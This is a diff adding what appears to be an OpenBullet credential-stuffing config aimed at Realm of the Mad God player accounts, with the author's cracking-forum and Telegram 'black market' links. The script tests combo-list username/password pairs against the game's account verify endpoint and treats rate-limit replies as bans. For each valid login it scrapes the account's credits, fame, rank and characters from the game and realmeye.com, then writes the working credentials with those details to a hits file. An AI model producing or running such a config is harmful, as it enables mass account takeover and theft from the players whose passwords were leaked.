@@ -1,0 +1,126 @@
+[SETTINGS]
+{
+  "Name": "ROTMG",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-15T09:52:15.5936896-03:00",
+  "AdditionalInfo": "",
+  "Author": "@JOHNHASH",
+  "Version": "1.2.4 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+## My Profile https://www.nulled.to/user/1535258-john1hash
+## My group https://t.me/elblackmarket
+## My Channel https://t.me/eltoolscracker
+## My PM https://t.me/johnhash
+## Thanks <3
+IF "<john1>" NotEqualto "<hash1>"
+
+REQUEST GET "http://worldclockapi.com/api/json/utc/now" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "currentDateTime" 
+
+PARSE "<SOURCE>" LR "\"currentDateTime\":\"" "T" -> VAR "TIM" 
+
+SET NEWGVAR "TIME" "<TIM>"
+SET NEWGVAR "john1" "10"
+SET NEWGVAR "hash1" "10"
+ENDIF
+SET STATUS NONE
+IF "<john>" NotEqualto "<hash>"
+
+#@JOHNHASH UTILITY File "ROTMG_ACCOUNTS <TIME>.txt" AppendLines "             " -> VAR "@JOHNHASH" 
+
+#@JOHNHASH UTILITY File "ROTMG_ACCOUNTS <TIME>.txt" AppendLines "## My Profile https://www.nulled.to/user/1535258-john1hash" -> VAR "@JOHNHASH" 
+
+#@JOHNHASH UTILITY File "ROTMG_ACCOUNTS <TIME>.txt" AppendLines "## My group https://t.me/elblackmarket" -> VAR "@JOHNHASH" 
+
+#@JOHNHASH UTILITY File "ROTMG_ACCOUNTS <TIME>.txt" AppendLines "## My Channel https://t.me/eltoolscracker" -> VAR "@JOHNHASH" 
+
+#@JOHNHASH UTILITY File "ROTMG_ACCOUNTS <TIME>.txt" AppendLines "## My PM https://t.me/johnhash" -> VAR "@JOHNHASH" 
+
+#@JOHNHASH UTILITY File "ROTMG_ACCOUNTS <TIME>.txt" AppendLines "█▬█ █ ▀█▀'S" -> VAR "@JOHNHASH" 
+
+#@JOHNHASH UTILITY File "ROTMG_ACCOUNTS <TIME>.txt" AppendLines "             " -> VAR "@JOHNHASH" 
+
+#@JOHNHASH UTILITY File "ROTMG_ACCOUNTS <TIME>.txt" AppendLines "ROTMG ACCOUNTS >    <TIME>" -> VAR "@JOHNHASH" 
+
+SET NEWGVAR "john" "10"
+SET NEWGVAR "hash" "10"
+ENDIF
+SET STATUS NONE
+
+#@JOHNHASH REQUEST POST "https://www.realmofthemadgod.com/account/verify?g=<USER>" 
+  CONTENT "ignore=41312&guid=<USER>&password=<PASS>&gameClientVersion=X31%2E7%2E0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.realmofthemadgod.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.realmofthemadgod.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: ShockwaveFlash/32.0.0.171" 
+  HEADER "Referer: https://www.realmofthemadgod.com/AssembleeGameClient1557733218.swf" 
+  HEADER "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#@JOHNHASH KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<Error>WebChangePasswordDialog.passwordError</Error>" 
+    KEY "Error>Error.invalidEmail</Error" 
+  KEYCHAIN Success OR 
+    KEY "<Account>" 
+  KEYCHAIN Ban OR 
+    KEY "minutes to try again!</Error>" 
+
+#@JOHNHASH PARSE "<SOURCE>" LR "<Name>" "</Name>" CreateEmpty=FALSE -> VAR "NAME" 
+
+#@JOHNHASH PARSE "<SOURCE>" LR "<Credits>" "</Credits" CreateEmpty=FALSE -> CAP "CREDITS" "" " 💰" 
+
+#@JOHNHASH PARSE "<SOURCE>" LR "<BestFame>" "</BestFame>" CreateEmpty=FALSE -> CAP "BEST_FAME" 
+
+#@JOHNHASH PARSE "<SOURCE>" LR "<TotalFame>" "</TotalFame" CreateEmpty=FALSE -> CAP "TOTAL_FAME" 
+
+#@JOHNHASH PARSE "<SOURCE>" LR "PetYardType>" "</PetYardType><" CreateEmpty=FALSE -> CAP "PET_YARD" "" " 🐢" 
+
+#@JOHNHASH REQUEST GET "https://www.realmeye.com/player/<NAME>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#@JOHNHASH PARSE "<SOURCE>" LR "Rank</td><td><div class=\"star-container\">" "<" CreateEmpty=FALSE -> CAP "RANK" "" " 👑" 
+
+#@JOHNHASH PARSE "<SOURCE>" LR "</span> at" "</td></tr></table></div><" CreateEmpty=FALSE -> CAP "SERVER" "" " ⏰" 
+
+#@JOHNHASH PARSE "<SOURCE>" LR "<td>First seen</td><td>~" "</td></tr" CreateEmpty=FALSE -> CAP "FIRST_SEEN" 
+
+#@JOHNHASH PARSE "<SOURCE>" LR "href=\"/player/<NAME>\">Characters" "</a></li" CreateEmpty=FALSE -> CAP "CHARACTERS" "" " 👮" 
+
+#@JOHNHASH PARSE "<SOURCE>" LR "\">Skins" "</a>" CreateEmpty=FALSE -> CAP "SKINS" "" " 👹" 
+
+#@JOHNHASH UTILITY File "ROTMG_ACCOUNTS <TIME>.txt" AppendLines "<USER>:<PASS>  / CREDITS: <CREDITS> / BEST_FAME: <BEST_FAME> / TOTAL_FAME: <TOTAL_FAME> / PET_YARD: <PET_YARD> / @JOHNHASH" -> VAR "@JOHNHASH" 
+
